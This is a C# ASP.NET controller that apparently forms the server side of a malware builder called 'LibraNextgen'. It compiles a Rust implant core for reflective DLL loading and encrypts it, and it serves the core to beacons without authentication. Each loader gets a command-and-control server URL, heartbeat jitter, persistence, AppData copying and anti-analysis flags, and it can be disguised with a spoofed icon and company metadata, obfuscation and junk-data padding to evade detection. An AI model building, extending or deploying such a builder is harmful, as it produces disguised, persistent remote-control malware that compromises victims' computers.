using System.Collections.Concurrent;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/builder")]
[Authorize]
public class BuilderController : ControllerBase
{
    private static readonly string OutputBase = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
    private static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");
    private static readonly string TemplateDir = Path.Combine(OutputBase, "loader-template");

    private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));

    private static readonly Dictionary<string, string> RustTargetTriple = new()
    {
        ["x64"] = "x86_64-pc-windows-msvc",
        ["x86"] = "i686-pc-windows-msvc",
        ["arm"] = "aarch64-unknown-linux-gnu",
    };

    private static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");
    private static readonly object _buildLock = new();
    private static readonly ConcurrentDictionary<string, BuildJob> _activeJobs = new();

    // ── Build history persistence ──────────────────────────────────────

    private static List<BuildRecord> LoadHistory()
    {
        try
        {
            if (System.IO.File.Exists(HistoryFile))
            {
                var json = System.IO.File.ReadAllText(HistoryFile);
                return JsonSerializer.Deserialize<List<BuildRecord>>(json) ?? new List<BuildRecord>();
            }
        }
        catch { }
        return new List<BuildRecord>();
    }

    private static void SaveHistory(List<BuildRecord> records)
    {
        try
        {
            Directory.CreateDirectory(OutputBase);
            var json = JsonSerializer.Serialize(records);
            System.IO.File.WriteAllText(HistoryFile, json);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[WARN] Failed to save build history: {ex.Message}");
        }
    }

    // ── Icon upload ────────────────────────────────────────────────────

    [HttpPost("upload-icon")]
    public async Task<IActionResult> UploadIcon(IFormFile file, CancellationToken ct)
    {
        if (file == null || file.Length == 0)
            return BadRequest(new { error = "No file provided." });

        var ext = Path.GetExtension(file.FileName).ToLower();
        if (ext != ".ico")
            return BadRequest(new { error = "Only .ico files are supported." });

        if (file.Length > 2 * 1024 * 1024)
            return BadRequest(new { error = "Icon file must be under 2 MB." });

        try
        {
            Directory.CreateDirectory(IconUploadDir);
            var fileName = $"{Guid.NewGuid():N}{ext}";
            var filePath = Path.Combine(IconUploadDir, fileName);
            await using var stream = System.IO.File.Create(filePath);
            await file.CopyToAsync(stream, ct);
            return Ok(new { path = filePath });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    // ── Build (async) ──────────────────────────────────────────────────

    [HttpPost("build")]
    public IActionResult Build([FromBody] BuildConfigRequest req)
    {
        if (!RustTargetTriple.ContainsKey(req.Platform))
            return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });

        var buildId = Guid.NewGuid().ToString("N")[..8];
        var record = new BuildRecord
        {
            Id = buildId,
            Platform = req.Platform,
            Config = req,
            FileName = $"agent-{req.Platform}-{buildId}.exe",
            Status = "building",
            CreatedAt = DateTime.UtcNow.ToString("o"),
        };

        // Save initial record
        var history = LoadHistory();
        history.Insert(0, record);
        SaveHistory(history);

        var job = new BuildJob { Record = record };
        _activeJobs[buildId] = job;

        // Run Rust build in background
        _ = Task.Run(() => RunBuildAsync(buildId, req, job));

        return Ok(new { buildId });
    }

    // ── SSE stream ─────────────────────────────────────────────────────

    [HttpGet("stream/{buildId}")]
    public async Task StreamBuild(string buildId, CancellationToken ct)
    {
        Response.Headers["Content-Type"] = "text/event-stream";
        Response.Headers["Cache-Control"] = "no-cache";
        Response.Headers["Connection"] = "keep-alive";

        if (!_activeJobs.TryGetValue(buildId, out var job))
        {
            // Build may have already completed — check history
            var history = LoadHistory();
            var record = history.FirstOrDefault(r => r.Id == buildId);
            if (record != null)
            {
                await SseWriteAsync($"data: {JsonSerializer.Serialize(new { type = "status", status = record.Status, error = record.Error })}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
            }
            else
            {
                await SseWriteAsync("data: {\"type\":\"error\",\"message\":\"Build not found\"}\n\n", ct);
            }
            return;
        }

        var lastIndex = 0;
        while (!ct.IsCancellationRequested)
        {
            var logs = job.GetLogs();
            while (lastIndex < logs.Count)
            {
                var line = JsonSerializer.Serialize(new { type = "log", text = logs[lastIndex] });
                await SseWriteAsync($"data: {line}\n\n", ct);
                lastIndex++;
            }

            if (job.IsCompleted)
            {
                var statusMsg = JsonSerializer.Serialize(new { type = "status", status = job.Record.Status, error = job.Record.Error });
                await SseWriteAsync($"data: {statusMsg}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
                break;
            }

            await Task.Delay(200, ct);
        }
    }

    private async Task SseWriteAsync(string text, CancellationToken ct)
    {
        var bytes = Encoding.UTF8.GetBytes(text);
        await Response.Body.WriteAsync(bytes, ct);
        await Response.Body.FlushAsync(ct);
    }

    // ── History CRUD ───────────────────────────────────────────────────

    [HttpGet("list")]
    public IActionResult List()
    {
        var history = LoadHistory();
        // Don't send full config in list view, just summary
        var items = history.Select(r => new
        {
            r.Id,
            r.Platform,
            r.FileName,
            r.FileSize,
            r.Status,
            r.Error,
            r.CreatedAt,
            r.CompletedAt,
        });
        return Ok(items);
    }

    [HttpGet("info/{buildId}")]
    public IActionResult Info(string buildId)
    {
        var history = LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });
        return Ok(record);
    }

    [HttpGet("download/{buildId}")]
    public IActionResult Download(string buildId)
    {
        var history = LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });

        var filePath = Path.Combine(OutputBase, buildId, record.FileName);
        if (!System.IO.File.Exists(filePath))
            return NotFound(new { error = "Build file not found on disk." });

        var stream = System.IO.File.OpenRead(filePath);
        return File(stream, "application/octet-stream", record.FileName);
    }

    [HttpDelete("{buildId}")]
    public IActionResult DeleteBuild(string buildId)
    {
        // If build is still running, don't allow delete
        if (_activeJobs.TryGetValue(buildId, out _))
            return BadRequest(new { error = "Cannot delete a build in progress." });

        var history = LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record != null)
        {
            history.Remove(record);
            SaveHistory(history);
        }

        // Clean up files
        var buildDir = Path.Combine(OutputBase, buildId);
        lock (_buildLock)
        {
            try { if (Directory.Exists(buildDir)) Directory.Delete(buildDir, true); }
            catch { /* best effort */ }
        }

        return Ok(new { status = "ok" });
    }

    // ── Template management ─────────────────────────────────────────────

    [HttpDelete("template")]
    public IActionResult ClearTemplate()
    {
        try
        {
            if (Directory.Exists(TemplateDir))
                Directory.Delete(TemplateDir, true);
            return Ok(new { status = "ok", message = "Loader template cleared. Next build will recompile." });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    [HttpGet("template")]
    public IActionResult TemplateStatus()
    {
        var platforms = Directory.Exists(TemplateDir)
            ? Directory.GetDirectories(TemplateDir).Select(d =>
            {
                var file = Directory.GetFiles(d).FirstOrDefault();
                return new
                {
                    platform = Path.GetFileName(d),
                    fileName = file != null ? Path.GetFileName(file) : "",
                    fileSize = file != null ? new FileInfo(file).Length : 0L,
                    updatedAt = file != null ? System.IO.File.GetLastWriteTimeUtc(file).ToString("o") : "",
                };
            }).Where(p => p.fileName != "").ToArray()
            : Array.Empty<object>();

        return Ok(platforms);
    }

    [HttpPost("template/upload")]
    public async Task<IActionResult> UploadTemplate([FromForm] IFormFile file, [FromForm] string platform)
    {
        var validPlatforms = new[] { "x64", "x86", "arm" };
        if (!validPlatforms.Contains(platform))
            return BadRequest(new { error = $"Invalid platform. Must be one of: {string.Join(", ", validPlatforms)}" });

        if (file == null || file.Length == 0)
            return BadRequest(new { error = "No file provided." });

        try
        {
            var platformDir = Path.Combine(TemplateDir, platform);
            Directory.CreateDirectory(platformDir);

            var fileName = platform == "arm" ? "loader" : "loader.exe";
            var targetPath = Path.Combine(platformDir, fileName);

            await using (var fs = System.IO.File.Create(targetPath))
            {
                await file.CopyToAsync(fs);
            }

            return Ok(new { status = "ok", platform, fileName, fileSize = file.Length });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    [HttpDelete("template/{platform}")]
    public IActionResult DeleteTemplate(string platform)
    {
        var platformDir = Path.Combine(TemplateDir, platform);
        if (!Directory.Exists(platformDir))
            return NotFound(new { error = $"Template for platform '{platform}' not found." });

        try
        {
            Directory.Delete(platformDir, true);
            return Ok(new { status = "ok" });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    // ── Core DLL delivery (no auth — DLL is AES-encrypted) ─────────────

    [HttpGet("/api/beacon/core/{buildId}")]
    [AllowAnonymous]
    public IActionResult DownloadCore(string buildId)
    {
        var corePath = Path.Combine(OutputBase, buildId, "core.bin");
        if (!System.IO.File.Exists(corePath))
            return NotFound(new { error = "Core not found." });

        var bytes = System.IO.File.ReadAllBytes(corePath);
        return File(bytes, "application/octet-stream", "core.bin");
    }

    // ── Build engine ───────────────────────────────────────────────────

    private async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
    {
        var tempDir = Path.Combine(OutputBase, buildId);
        var targetDir = Path.Combine(tempDir, "target");

        try
        {
            lock (_buildLock)
            {
                if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true);
                Directory.CreateDirectory(tempDir);
            }

            // Check cargo availability
            job.Log("Checking Rust toolchain...");
            var cargoCheck = await RunProcessAsync("cargo", "--version", job);
            if (cargoCheck.ExitCode != 0)
            {
                job.Fail("Cargo/Rust is not installed. Install from https://rustup.rs");
                UpdateHistory(job);
                return;
            }
            job.Log($"Rust toolchain: {cargoCheck.Stdout.Trim()}");

            // Determine target triple
            string? targetTriple = null;
            if (RustTargetTriple.TryGetValue(req.Platform, out var triple))
                targetTriple = triple;

            var targetArg = targetTriple != null ? $"--target {targetTriple}" : "";

            // Desktop mode: add --features desktop
            var featuresArg = req.ApplicationType == "Desktop" ? "--features desktop" : "";

            // Set RUSTFLAGS for strip if requested
            var envVars = new Dictionary<string, string>();
            if (req.StripSymbols)
            {
                envVars["RUSTFLAGS"] = "-C strip=symbols";
                job.Log("Strip symbols enabled (RUSTFLAGS=-C strip=symbols)");
            }

            var isWindows = (targetTriple != null && targetTriple.Contains("windows")) || targetTriple == null;

            // ══════════════════════════════════════════════════════════════
            // Stage 1: Build Core DLL
            // ══════════════════════════════════════════════════════════════
            job.Log("=== Stage 1: Building Core DLL ===");
            var coreBuildArgs = $"build --release {targetArg} -p core --target-dir \"{targetDir}\"";
            job.Log($"cargo {coreBuildArgs}");

            var coreBuildResult = await RunProcessAsync("cargo", coreBuildArgs, job, RustAgentDir, envVars);
            if (coreBuildResult.ExitCode != 0)
            {
                job.Fail($"Core build failed (exit code {coreBuildResult.ExitCode})");
                UpdateHistory(job);
                return;
            }

            // Find core output
            var releaseDir = targetTriple != null
                ? Path.Combine(targetDir, targetTriple, "release")
                : Path.Combine(targetDir, "release");

            var coreDllName = isWindows ? "core.dll" : "libcore.so";
            var coreDllPath = Path.Combine(releaseDir, coreDllName);
            if (!System.IO.File.Exists(coreDllPath))
            {
                var found = Directory.GetFiles(releaseDir, "*core*")
                    .FirstOrDefault(f => f.EndsWith(".dll") || f.EndsWith(".so") || f.EndsWith(".dylib"));
                if (found != null) coreDllPath = found;
            }

            if (!System.IO.File.Exists(coreDllPath))
            {
                job.Fail($"Core DLL not found at {releaseDir}");
                UpdateHistory(job);
                return;
            }

            var coreDllBytes = await System.IO.File.ReadAllBytesAsync(coreDllPath);
            job.Log($"Core DLL found: {coreDllPath} ({coreDllBytes.Length / 1024} KB)");

            // ══════════════════════════════════════════════════════════════
            // Stage 1.5: Validate Core DLL via sRDI tool
            // ══════════════════════════════════════════════════════════════
            job.Log("=== Stage 1.5: Validating Core DLL for reflective loading ===");
            var srdiArgs = $"run --release -p srdi --target-dir \"{targetDir}\" -- \"{coreDllPath}\" core_main";
            var srdiResult = await RunProcessAsync("cargo", srdiArgs, job, RustAgentDir, envVars);
            if (srdiResult.ExitCode != 0)
            {
                job.Fail($"Core DLL validation failed — 'core_main' export not found or DLL is invalid");
                UpdateHistory(job);
                return;
            }
            job.Log("Core DLL validated: PE structure OK, 'core_main' export present");

            // ══════════════════════════════════════════════════════════════
            // Stage 2: Encrypt Core DLL
            // ══════════════════════════════════════════════════════════════
            job.Log("=== Stage 2: Encrypting Core DLL ===");

            // Generate AES-256 key
            var aesKey = RandomNumberGenerator.GetBytes(32);

            // AES-256-GCM encrypt the core DLL
            var aesNonce = RandomNumberGenerator.GetBytes(12);
            using var aes = new AesGcm(aesKey, 16);
            var ciphertext = new byte[coreDllBytes.Length];
            var tag = new byte[16];
            aes.Encrypt(aesNonce, coreDllBytes, ciphertext, tag);

            // Combine: nonce(12) || ciphertext || tag(16)
            var encryptedCore = new byte[aesNonce.Length + ciphertext.Length + tag.Length];
            Buffer.BlockCopy(aesNonce, 0, encryptedCore, 0, aesNonce.Length);
            Buffer.BlockCopy(ciphertext, 0, encryptedCore, aesNonce.Length, ciphertext.Length);
            Buffer.BlockCopy(tag, 0, encryptedCore, aesNonce.Length + ciphertext.Length, tag.Length);

            // Save encrypted core
            var coreBinPath = Path.Combine(tempDir, "core.bin");
            await System.IO.File.WriteAllBytesAsync(coreBinPath, encryptedCore);
            job.Log($"Encrypted core saved: {encryptedCore.Length / 1024} KB");

            // Generate RSA-2048 keypair
            using var rsa = RSA.Create(2048);
            var rsaPublicKey = Convert.ToBase64String(rsa.ExportSubjectPublicKeyInfo());
            var rsaPrivateKey = Convert.ToBase64String(rsa.ExportPkcs8PrivateKey());

            // RSA-OAEP encrypt the AES key
            var encryptedAesKey = rsa.Encrypt(aesKey, RSAEncryptionPadding.OaepSHA256);
            var encryptedAesKeyB64 = Convert.ToBase64String(encryptedAesKey);

            job.Log("AES key generated, RSA keypair created, AES key encrypted");

            // ══════════════════════════════════════════════════════════════
            // Stage 3: Get Loader (from template or build fresh)
            // ══════════════════════════════════════════════════════════════
            job.Log("=== Stage 3: Preparing Loader ===");

            var loaderExeName = isWindows ? "loader.exe" : "loader";
            var templatePlatformDir = Path.Combine(TemplateDir, $"{req.Platform}-{req.ApplicationType.ToLower()}");
            var templatePath = Path.Combine(templatePlatformDir, loaderExeName);
            var exePath = Path.Combine(tempDir, loaderExeName);

            if (System.IO.File.Exists(templatePath))
            {
                // ── Use cached template ──
                job.Log($"Using cached loader template: {templatePath}");
                System.IO.File.Copy(templatePath, exePath, true);
            }
            else
            {
                // ── First time: compile loader and save as template ──
                job.Log("No template found, compiling loader from source...");
                var loaderBuildArgs = $"build --release {targetArg} {featuresArg} -p loader --target-dir \"{targetDir}\"";
                job.Log($"cargo {loaderBuildArgs}");

                var loaderBuildResult = await RunProcessAsync("cargo", loaderBuildArgs, job, RustAgentDir, envVars);
                if (loaderBuildResult.ExitCode != 0)
                {
                    job.Fail($"Loader build failed (exit code {loaderBuildResult.ExitCode})");
                    UpdateHistory(job);
                    return;
                }

                var compiledLoader = Path.Combine(releaseDir, loaderExeName);
                if (!System.IO.File.Exists(compiledLoader))
                {
                    var found = Directory.GetFiles(releaseDir, "*")
                        .FirstOrDefault(f => Path.GetFileName(f) == "loader" || Path.GetFileName(f) == "loader.exe");
                    if (found != null) compiledLoader = found;
                }

                if (!System.IO.File.Exists(compiledLoader))
                {
                    job.Fail($"Loader binary not found at {releaseDir}");
                    UpdateHistory(job);
                    return;
                }

                // Save as template for future builds
                Directory.CreateDirectory(templatePlatformDir);
                System.IO.File.Copy(compiledLoader, templatePath, true);
                job.Log($"Loader template saved: {templatePath}");

                // Copy to build directory
                System.IO.File.Copy(compiledLoader, exePath, true);
            }

            job.Log($"Loader ready: {new FileInfo(exePath).Length / 1024} KB");

            // ── Icon & metadata embedding via rcedit (Windows PE only) ──
            if (isWindows && HasIconOrMetadata(req))
            {
                await EmbedIconAndMetadata(req, exePath, job);
            }

            // ══════════════════════════════════════════════════════════════
            // Stage 4: Inject Config into Loader
            // ══════════════════════════════════════════════════════════════
            job.Log("=== Stage 4: Injecting Config ===");
            var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
            var injectedConfig = new InjectedConfig
            {
                server_url = serverUrl,
                register_path = "/api/beacon/register",
                heartbeat_path = "/api/beacon/heartbeat",
                result_path = "/api/beacon/result",
                ws_path = "/ws/agent",
                heartbeat_interval_ms = 3000,
                jitter_percent = 0.2,
                require_admin = req.RequireAdmin,
                copy_to_path = req.CopyToAppData ? "LibraNextgen" : null,
                enable_persistence = req.EnablePersistence,
                encrypted_aes_key = encryptedAesKeyB64,
                core_download_path = $"/api/beacon/core/{buildId}",
                rsa_private_key = rsaPrivateKey,
                anti_analysis = req.AntiAnalysis,
            };

            var configJson = JsonSerializer.Serialize(injectedConfig);
            var configBytes = Encoding.UTF8.GetBytes(configJson);
            var magicBytes = Encoding.UTF8.GetBytes("LIBRA_CFG_BLOCK!");

            await using (var fs = System.IO.File.Open(exePath, FileMode.Append))
            {
                await fs.WriteAsync(magicBytes);
                var lenBytes = BitConverter.GetBytes((uint)configBytes.Length);
                await fs.WriteAsync(lenBytes);
                await fs.WriteAsync(configBytes);
            }

            job.Log($"Config injected: {configJson.Length} bytes");

            // ── Goldberg obfuscation ──
            if (req.EnableObfuscation)
            {
                job.Log("Running goldberg obfuscation...");
                try
                {
                    var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{exePath}\"", job);
                    if (goldbergResult.ExitCode == 0)
                        job.Log("Goldberg obfuscation completed.");
                    else
                        job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
                }
                catch (Exception ex)
                {
                    job.Log($"[WARN] goldberg not available: {ex.Message}");
                }
            }

            // ── Junk data injection ──
            if (req.InjectJunkData && req.JunkDataMb > 0)
            {
                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
                await fs.WriteAsync(junk);
            }

            // ── Move to final output ──
            var finalDir = Path.Combine(OutputBase, buildId);
            var finalPath = Path.Combine(finalDir, job.Record.FileName);
            var finalCorePath = Path.Combine(finalDir, "core.bin");
            Directory.CreateDirectory(finalDir);

            // Write core.bin via system temp + move (avoids Defender directory scan lock)
            job.Log("Writing core.bin...");
            var tempCorePath = Path.Combine(Path.GetTempPath(), $"libra_{buildId}.bin");
            await System.IO.File.WriteAllBytesAsync(tempCorePath, encryptedCore);
            System.IO.File.Move(tempCorePath, finalCorePath, true);
            job.Log($"core.bin written: {encryptedCore.Length / 1024} KB");

            // Copy loader
            job.Log("Copying loader...");
            System.IO.File.Copy(exePath, finalPath, true);

            var fileInfo = new FileInfo(finalPath);
            job.Complete(fileInfo.Length);
            job.Log($"Build complete: {finalPath} ({fileInfo.Length / 1024} KB), core.bin ({encryptedCore.Length / 1024} KB)");

            UpdateHistory(job);
        }
        catch (Exception ex)
        {
            job.Fail($"Build failed: {ex.Message}");
            UpdateHistory(job);
        }
        finally
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(30_000);
                _activeJobs.TryRemove(buildId, out _);
            });
        }
    }

    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null, Dictionary<string, string>? envVars = null)
    {
        var psi = new ProcessStartInfo(fileName, arguments)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        if (workingDir != null) psi.WorkingDirectory = workingDir;
        if (envVars != null)
        {
            foreach (var (key, value) in envVars)
                psi.Environment[key] = value;
        }

        using var proc = new Process { StartInfo = psi };
        var stdoutTcs = new TaskCompletionSource<string>();
        var stderrTcs = new TaskCompletionSource<string>();
        var stdout = new StringBuilder();
        var stderr = new StringBuilder();

        proc.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log(e.Data); stdout.AppendLine(e.Data); }
            else stdoutTcs.TrySetResult(stdout.ToString());
        };
        proc.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log($"[stderr] {e.Data}"); stderr.AppendLine(e.Data); }
            else stderrTcs.TrySetResult(stderr.ToString());
        };

        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        await proc.WaitForExitAsync();
        var stdoutStr = await stdoutTcs.Task;
        var stderrStr = await stderrTcs.Task;

        return new ProcessResult(proc.ExitCode, stdoutStr, stderrStr);
    }

    private static void UpdateHistory(BuildJob job)
    {
        var history = LoadHistory();
        var idx = history.FindIndex(r => r.Id == job.Record.Id);
        if (idx >= 0)
            history[idx] = job.Record;
        else
            history.Insert(0, job.Record);
        SaveHistory(history);
    }

    // ── Helpers ────────────────────────────────────────────────────────

    private static bool HasIconOrMetadata(BuildConfigRequest req)
    {
        return !string.IsNullOrEmpty(req.IconUrl) ||
               !string.IsNullOrEmpty(req.CompanyName) ||
               !string.IsNullOrEmpty(req.FileDescription) ||
               !string.IsNullOrEmpty(req.ProductName) ||
               !string.IsNullOrEmpty(req.Copyright) ||
               !string.IsNullOrEmpty(req.FileVersion);
    }

    private async Task EmbedIconAndMetadata(BuildConfigRequest req, string exePath, BuildJob job)
    {
        job.Log("Embedding icon/metadata via rcedit...");

        // Resolve icon file
        string? iconPath = null;
        if (!string.IsNullOrEmpty(req.IconUrl))
        {
            try
            {
                if (System.IO.File.Exists(req.IconUrl))
                {
                    iconPath = req.IconUrl;
                }
                else if (req.IconUrl.StartsWith("http"))
                {
                    using var http = new HttpClient();
                    var iconBytes = await http.GetByteArrayAsync(req.IconUrl);
                    iconPath = Path.Combine(Path.GetTempPath(), $"libra-icon-{Guid.NewGuid():N}.ico");
                    await System.IO.File.WriteAllBytesAsync(iconPath, iconBytes);
                }
            }
            catch { job.Log("[WARN] Icon download failed, skipping icon."); }
        }

        var args = new List<string>();
        if (iconPath != null) args.Add($"--set-icon \"{iconPath}\"");
        if (!string.IsNullOrEmpty(req.FileVersion))
        {
            args.Add($"--set-file-version \"{req.FileVersion}\"");
            args.Add($"--set-product-version \"{req.FileVersion}\"");
        }
        if (!string.IsNullOrEmpty(req.CompanyName))
            args.Add($"--set-version-string CompanyName \"{req.CompanyName}\"");
        if (!string.IsNullOrEmpty(req.FileDescription))
            args.Add($"--set-version-string FileDescription \"{req.FileDescription}\"");
        if (!string.IsNullOrEmpty(req.ProductName))
            args.Add($"--set-version-string ProductName \"{req.ProductName}\"");
        if (!string.IsNullOrEmpty(req.Copyright))
            args.Add($"--set-version-string LegalCopyright \"{req.Copyright}\"");

        if (args.Count == 0) return;

        var rceditArgs = $"\"{exePath}\" {string.Join(" ", args)}";
        try
        {
            var result = await RunProcessAsync("rcedit", rceditArgs, job);
            if (result.ExitCode == 0)
                job.Log("Icon/metadata embedded successfully.");
            else
                job.Log($"[WARN] rcedit failed (exit {result.ExitCode}), continuing without icon/metadata.");
        }
        catch (Exception ex)
        {
            job.Log($"[WARN] rcedit not available: {ex.Message}. Install rcedit to enable icon/metadata embedding.");
        }
    }
}

// ── Supporting types ──────────────────────────────────────────────────

public class BuildRecord
{
    public string Id { get; set; } = "";
    public string Platform { get; set; } = "x64";
    public BuildConfigRequest? Config { get; set; }
    public string FileName { get; set; } = "";
    public long FileSize { get; set; }
    public string Status { get; set; } = "building"; // building, completed, failed
    public string? Error { get; set; }
    public string CreatedAt { get; set; } = "";
    public string? CompletedAt { get; set; }
}

internal record struct ProcessResult(int ExitCode, string Stdout, string Stderr);

public class BuildJob
{
    private readonly List<string> _logs = new();
    private readonly object _lock = new();

    public BuildRecord Record { get; set; } = null!;
    public bool IsCompleted { get; private set; }

    public void Log(string line)
    {
        lock (_lock) { _logs.Add(line); }
    }

    public List<string> GetLogs()
    {
        lock (_lock) { return _logs.ToList(); }
    }

    public void Complete(long fileSize)
    {
        IsCompleted = true;
        Record.Status = "completed";
        Record.FileSize = fileSize;
        Record.CompletedAt = DateTime.UtcNow.ToString("o");
    }

    public void Fail(string error)
    {
        IsCompleted = true;
        Record.Status = "failed";
        Record.Error = error;
        Record.CompletedAt = DateTime.UtcNow.ToString("o");
    }
}
